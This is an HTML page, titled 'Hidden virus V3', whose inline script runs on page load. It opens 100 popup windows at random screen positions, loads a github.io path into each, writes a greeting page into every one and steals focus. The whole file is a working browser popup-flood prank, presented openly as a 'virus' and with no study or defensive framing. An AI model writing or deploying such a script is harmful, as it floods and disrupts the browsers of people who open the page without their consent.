<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hidden virus V3</title>
</head>
    <body>
        <script>
            for(var i = 0; i<100; i++){
            // Define the width and height of the new window
            const windowWidth = 400;
            const windowHeight = 300;

            // Calculate random coordinates for the new window
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const randomX = Math.floor(Math.random() * (screenWidth - windowWidth));
            const randomY = Math.floor(Math.random() * (screenHeight - windowHeight));

            // Open a new window with the specified dimensions and position
            const newWindow = window.open('pa30292.github.io/viru/viru', '', `width=${windowWidth}, height=${windowHeight}, left=${randomX}, top=${randomY}`);

            // Add content to the new window (you can replace this with your content)
            newWindow.document.write('<html><head><title>Random Window</title></head><body><h1>Hello, this is a random window!</h1></body></html>');

            // Focus the new window
            newWindow.focus();
        }
        </script>
    </body>
</html>
